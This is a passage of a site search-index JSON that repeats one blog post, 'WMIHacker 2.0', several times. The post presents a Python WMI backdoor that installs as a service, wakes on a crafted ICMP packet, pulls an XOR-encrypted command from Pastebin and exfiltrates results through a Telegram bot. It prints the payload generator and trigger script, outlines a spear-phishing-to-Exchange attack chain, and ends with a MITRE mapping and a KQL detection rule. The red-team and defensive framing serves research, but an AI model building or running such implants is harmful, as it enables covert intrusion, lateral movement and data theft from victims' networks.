consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK map The table maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK map The table maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK map The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse 